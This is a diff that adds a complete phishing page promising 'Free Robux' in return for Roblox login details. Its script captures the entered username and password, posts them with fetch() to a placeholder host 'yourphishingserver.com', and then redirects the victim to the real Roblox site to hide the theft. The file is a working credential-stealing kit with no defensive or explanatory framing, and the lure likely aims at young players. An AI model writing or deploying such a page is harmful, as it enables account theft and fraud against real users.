@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Robux!</title>
+</head>
+<body>
+  <h1>Enter your Roblox credentials for free Robux!</h1>
+  <form id="phishingForm">
+    <input type="text" id="username" placeholder="Username" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <button type="submit">Claim Robux</button>
+  </form>
+
+  <script>
+    document.getElementById('phishingForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Send the credentials to your server
+      fetch('http://yourphishingserver.com/capture', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username: username, password: password })
+      })
+      .then(response => {
+        if (response.ok) {
+          // Redirect the victim to the real Roblox site or something else
+          window.location.href = 'https://www.roblox.com';
+        } else {
+          alert('Error submitting credentials.');
+        }
+      });
+    });
+  </script>
+</body>
+</html>
